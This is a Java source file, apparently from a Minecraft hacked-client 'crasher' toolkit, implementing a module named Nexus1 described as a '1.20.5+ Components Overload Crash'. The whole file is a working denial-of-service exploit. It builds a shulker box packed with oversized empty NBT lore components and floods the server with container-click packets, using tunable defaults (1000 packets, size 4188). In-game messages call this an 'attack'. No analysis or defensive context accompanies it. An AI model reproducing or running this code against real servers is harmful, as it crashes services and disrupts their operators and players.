package us.whitedev.crashers.impl;

import de.florianmichael.vialoadingbase.ViaLoadingBase;
import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import net.minecraft.nbt.CompoundTag;
import org.checkerframework.checker.units.qual.C;
import us.whitedev.crashers.Crasher;
import us.whitedev.gui.clickgui.ClickGui;
import us.whitedev.protocol.XynisProtocol;
import us.whitedev.protocol.components.data.DataComponents;
import us.whitedev.protocol.components.data.impl.DataChargedProjectiles;
import us.whitedev.protocol.components.data.impl.DataContainer;
import us.whitedev.protocol.components.data.impl.DataCustomName;
import us.whitedev.protocol.components.data.impl.DataLore;
import us.whitedev.protocol.components.objects.ItemStack;
import us.whitedev.protocol.components.objects.ItemType;
import us.whitedev.protocol.packets.PacketCodec;
import us.whitedev.protocol.packets.play.PacketContainerClick;
import us.whitedev.utils.OptionType;
import us.whitedev.utils.OptionUtil;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

public class Nexus1 implements Crasher {
    private static final String METHOD_NAME = "Nexus1";
    private boolean enabled = false;
    private ScheduledExecutorService executorService;


    @Override
    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[2]);
        int size = Integer.parseInt(args[3]);
        int scales = Integer.parseInt(args[4]);
        int threadSleep = Integer.parseInt(args[5]);
        long loopAmount = Long.parseLong(args[6]);
        setEnabled(true);

        if (executorService != null && !executorService.isShutdown()) {
            executorService.shutdownNow();
            msgHelper.sendMessage("Previous attack &cstopped&7!", true);
        }

        msgHelper.sendMessage("Starting crashing with &f" + (ClickGui.IS_VISIBLE ? getName() : "******"), true);

        int protocol = ViaLoadingBase.getInstance().getTargetVersion().getVersion();
        if (XynisProtocol.SUPPORTED_PROTOCOLS.contains(protocol)) {
            List<CompoundTag> itemLore = new ArrayList<>();

            for (int i = 0; i < size; ++i) itemLore.add(new CompoundTag());

            DataComponents components = new DataComponents();
            components.put(new DataCustomName(new CompoundTag()));
            components.put(new DataLore(itemLore));
            ItemStack stack = new ItemStack(1, 1, components);

            List<ItemStack> itemStacks = new ArrayList<>(scales);

            for (int i = 0; i < scales; ++i) itemStacks.add(stack);

            DataComponents shulkerComps = new DataComponents();
            shulkerComps.put(new DataContainer(itemStacks));

            ItemStack shulker = new ItemStack(ItemType.SHULKER_BOX.getId(protocol), 1, shulkerComps);

            AtomicInteger check = new AtomicInteger(0);
            executorService = Executors.newSingleThreadScheduledExecutor();
            Runnable clickTask = () -> {
                if (!enabled || check.get() == loopAmount || (mc.getConnection() == null || !mc.getConnection().getConnection().isConnected())) {
                    executorService.shutdown();
                    setEnabled(false);
                    msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
                    return;
                }
                PacketCodec.sendPacket(new PacketContainerClick(protocol, 0, 1, 37,
                        PacketContainerClick.ContainerActionType.CLICK_ITEM, PacketContainerClick.ContainerAction.LEFT_CLICK,
                        shulker, new Int2ObjectArrayMap<>()), packets);
                check.getAndIncrement();
            };
            executorService.scheduleWithFixedDelay(clickTask, 0, threadSleep, TimeUnit.MILLISECONDS);
        } else {
            msgHelper.sendMessage("To use " + getName() + " you must be using &cVersion 1.21.2/1.21.4&7, and your current protocol is &c" + protocol, true);
        }
    }


    @Override
    public String getName() {
        return METHOD_NAME;
    }

    @Override
    public boolean getEnabled() {
        return enabled;
    }

    @Override
    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }

    @Override
    public String getArgsUsage() {
        return "packets[1000], size[4188], scales[11], sleep[1], loop[1]";
    }

    @Override
    public List<OptionUtil> getOptions() {
        return List.of(
                new OptionUtil("Packets", OptionType.INTEGER),
                new OptionUtil("Size", OptionType.INTEGER),
                new OptionUtil("Scales", OptionType.INTEGER),
                new OptionUtil("Sleep", OptionType.INTEGER),
                new OptionUtil("Loop", OptionType.INTEGER)
        );
    }

    @Override
    public String getDescription() {
        return "1.20.5+ Components Overload Crash";
    }
}
